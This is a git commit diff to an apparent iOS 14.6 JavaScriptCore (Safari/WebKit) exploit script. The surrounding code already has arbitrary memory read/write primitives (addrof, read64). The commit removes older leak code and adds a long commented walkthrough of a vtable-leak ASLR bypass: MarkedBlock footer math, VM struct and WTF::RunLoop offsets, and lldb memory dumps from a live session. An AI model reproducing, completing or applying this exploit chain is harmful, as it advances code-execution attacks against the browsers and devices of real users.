ce455a4017879f48b36e431f7a53d0080364b353
Turnerhackz1 <turner881189@gmail.com>
2022-06-29 14:35:04 -0500

    new vtable leak explanation

--- 14.6.js
+++ 14.6.js
@@ -635,50 +635,99 @@ for (var i = 0; i < 1000; ++i) {
     };
         print("we have arbitrary r/w with JSArray :)");
    	memory = stage2;
-	var bb = {};
-        //bb[0] = 1.1
-        var bbaddr = stage2.addrof(bb);
-        print("object address @ " + bbaddr);
-        var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
-        //refer to VM.h this is
-        //JSC::MarkedBlock::footer at 0ffset 8 should be the vm struct
-        print("footeraddr @ " + footeraddr);
-        var vmstruct = stage2.read64(footeraddr+0x08); 
-        print("vmstruct @ " + vmstruct);
-        //var structdump = stage2.read(vmstruct,0x30);
-        //var m_runloop = stage2.readInt64(vmstruct+0x10); might be 0x20 instead of 0x10
-        //Ref <WTF::RunLoop> m_runLoop; at offset 0x10-0x18 proceeded by m_random
-        //print("m_runloop @ " + m_runloop);
-        //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
-        //var vtable = stage2.readInt64(m_runloop);
-        //print("vtable @ " + vtable);
-	//var anchor = stage.readInt64(vtable);
-	//var hdr = Sub(anchor, anchor.lo() & 0xfff);
-	//print("JSC header @ " + hdr); 
-	/*var sinFuncAddr = addrof(Math.sin);
-        print("Math.sin() @ " + sinFuncAddr);
-        var executableAddr = memory.readInt64(Add(sinFuncAddr,24));
-	//print("executableaddr @ " + executableAddr);
-        print("Math.sin() ExecutableAddr @ " + executableAddr); 
-        var jitCodeAddr = memory.readInt64(Add(executableAddr , 24));
-	print("Math.sin() NativeJITCodeAddr @ " + jitCodeAddr);*/
-        
-        /*var vtab = memory.read64(jitCodeAddr , 0);
-        print("Math.sin() vtable @ " + vtab)*/
-        /*var anchor1 = memory.readInt64(vtab)
-        print("anchor1" + anchor1);
-        var jsc = Sub(anchor1, anchor1.lo() & 0xfff);
-	print('JSC header @' + jsc);  //dyld_cache_header
-        while(true)
-        {
-        if(strcmp(memory.read(jsc, 0x10), "dyld_v1   arm64" || "dyld_v1   arm64e")) //cache header magic
-        //webcore header magic...
-        {
-            print("found it @ " + jsc + ":" + String.fromCharCode(...memory.read(jsc, 0x10)))
-            break;
-        }
-        jsc = Sub(jsc, 0x1000);
-        }*/
+	print("~Turnerhackz1 shoutout to the best teacher ever for this vtable leak method :)");
+	var a = {}
+	//firstly we need to Calculate JSC::MarkedBlock::Footer or aka footer().vm()
+	//JSC truncates everything to 32 bits so we need to truncate object address to a 32 bit address and do some math fucccckkkk
+	//running lldb /System/Library/Frameworks/Versions/A/Helpers/jsc
+	//then typing r to continue or run will yield us a JSC interpreter
+	// if we run a = {} then run desrcibe(a) yields us this info 
+	//>>> describe(a)
+/*"Object: 0x12c4c0040 with butterfly 0x0(base=0xfffffffffffffff8) (Structure 0x12c429730:[0x2db8/11704, Object, (0/6, 0/0){}, NonArray, 
+Proto:0x10a0253e8, Leaf]), StructureID: 11704"*/
+	//as you can see our object addrss is 0x12c4c0040 lets perform math and 32 bit truncation on it 
+	//BlockSize is iOS/macOS page size dependent for i6s and i7 and ipX i know its 0x4000 bytes large but anything after that is a guessing game
+	//maybe can find out with p/x sizeof with lldb but havent tried it but i can confirm BlockSize in ios 12.1.4 i6s dyldsharedcache is 0x4000
+	// p/x sizeof(JSC::MarkedBlock::Footer) yields 0x128 on debug builds but i think all devices are shipped with a release build version of webkit
+	//0x128 seems to crash my idevices and my teacher told me that it for my device the offset is 0x130 so i tried that and it works so i guess
+	// its 0x130 on releasebuilds or at least for ios 14.6
+	// to calculate footer address aka JSC::MarkedBlock::Footer() 
+	//footeraddr = "0x" + ((objaddr & 0xfffc0000) + (((bbaddr/0x100000000)|0)*0x100000000)+blocksize-footersize).toString(16);
+	//on my device as describe our object address is 0x12c4c0040 which can be found with our addrof() primitives yielded this
+	// footeraddr = "0x" + ((objaddr & 0xffffc000) + (((objaddr/0x100000000)|0)*0x100000000) + blockSize - footerSize).toString(16)
+	//"0x12c4c3ed0"
+	//pressing control c to exit jsc and back to lldb we can confirm this with lldb memory reads
+	//our footeraddr should contains a segments of a bunch of zeroes that address contains our vm struct lets find out 
+	/* (lldb) x/10gx 0x12c4c3ed0
+0x12c4c3ed0: 0x0000000109004840 0x000000012c000000
+0x12c4c3ee0: 0x000000012c003998 0xff1fff1f00000000
+0x12c4c3ef0: 0x0000000000000000 0x0000000000000000
+0x12c4c3f00: 0x0000000000000000 0x0000000000000000
+0x12c4c3f10: 0x0000000000000000 0x0000000000000000
+(lldb) # our vm struct is +0x8 from footeaddr 0x000000012c000000 
+*/ 
+	//as you can see our vmstruct on macos 12.3.1 jsc binary is at +0x8 this might be a different offset depending on device and version
+	//0x000000012c000000 contains a whole bunch of zeroes so its definitely correct so lets read on this address
+	/*(lldb) x/10gx 0x000000012c000000
+0x12c000000: 0x0000000100000002 0x00000001090200c0
+0x12c000010: 0x000000010900c100 0x00000000b1f15d16
+0x12c000020: 0x5d26f673be00a5e3 0x6df5eb3d70828542
+0x12c000030: 0xc000001c00000500 0x0000000000000000
+0x12c000040: 0x0000000000000000 0x0000000000000001
+*/ 
+	//according to https://github.com/WebKit/WebKit/blob/releases/Apple/Safari-14.1.1-iOS-14.6/Source/JavaScriptCore/runtime/VM.h 
+	//starting at line 337 we have 
+	/*private:
+    unsigned nextID(); skip 0x0 - 8
+
+    static Atomic<unsigned> s_numberOfIDs; skip 0x8 - 0x10
+
+    unsigned m_id; 0x0 - 0x8
+    RefPtr<JSLock> m_apiLock; 0x8 - 0x10
+    Ref<WTF::RunLoop> m_runLoop; 0x10 - 0x18 this is the address we want! to verify we can see that our address is followed by a bunch of random numbers
+    if so then we have the right address lets look at it again
+
+    WeakRandom m_random; 0x18 - 0x20 
+    Integrity::Random m_integrityRandom; 0x20 - 0x30
+*/
+	/*(lldb) x/10gx 0x000000012c000000
+0x12c000000: 0x0000000100000002 0x00000001090200c0 this is 0x0 - 0x8 then 0x8 - 0x10
+0x12c000010: 0x000000010900c100 0x00000000b1f15d16 this is 0x10 - 0x18 then 0x18 - 0x20 0x18 -0x20 is m_random which is also random number :)
+0x12c000020: 0x5d26f673be00a5e3 0x6df5eb3d70828542 this is 0x20 - 0x28 then 0x28 - 0x30 random numbers like i said :))))))
+0x12c000030: 0xc000001c00000500 0x0000000000000000 so 0x10900c100 is our Ref<WTF::RunLoop> m_runLoop which is what we want:)
+0x12c000040: 0x0000000000000000 0x0000000000000001*/
+	//in the dyld shared cache there is a vtable for WTF::RunLoop hence why we want it so bad 
+	//with an actual vtable leak you can use it to redirect control flow by overwriting it and calling a function of a vtable 
+	// but there is no user callable vtable function that we can use so why are we so interested your wondering? because any vtable leak
+	//leads to finding the base of said section it falls in which in this case its the __Data segment of JSC
+	//                     __ZTVN3WTF7RunLoopE:        // vtable for WTF::RunLoop in a disassembler this is our vtable
+	//so lets look into our m_runLoop to see what we have with lldb
+	/*(lldb) x/10gx 0x000000010900c100
+0x10900c100: 0x00708001e9ab0b10 0x0000000000000004 // offset 0x0 - 0x8 contains something interesting ;) its a signed vtable everything following is useless
+0x10900c110: 0x0000000000000000 0x0000000000000000
+0x10900c120: 0x0000000000000000 0x0000000000000000
+0x10900c130: 0x0000000000000000 0x0000000000000000
+0x10900c140: 0x0000000000000000 0x0000000000000000
+*/
+	//so as you can see m_runLoop contains a signed vtable address at offset 0 of the class which is expected in C++
+	//every class whether public: or private: contains a vfptr or vptr at offset 0 which points to the vtable :)
+	//as stated JSC does truncate everything down to 32 bits hence why the 48 bits and up is useless this is a 16 number hex address
+	//each 4 numbers represents 16 bits, 16 x 4 sets of numbers = 64 bits so this address is 64 bits long so the upper 7 numbers are 28 bits
+	//are completely useless so removing that we get 0x1e9ab0b10 which a 32 bit value. lets look into it:)
+	
+	/*(lldb) x/10gx 0x1e9ab0b10
+0x1e9ab0b10: 0x49588001a8005788 0xbf058001a800578c
+0x1e9ab0b20: 0xe5390001a80047bc 0x0000000000000000
+0x1e9ab0b30: 0x0000000000000000 0x00748001a8005b44
+0x1e9ab0b40: 0x8e508001a8005b48 0xfd5300018e9684c0
+0x1e9ab0b50: 0x0000000000000000 0x0000000000000000
+*/
+	//dont know what this is but it looks like function prologues addresses represented by 64 bit which definitely looks correct :)
+	//lets give ios 14.6 a try at this same method shall we
+	
+
+
+	
 	      
 	
 
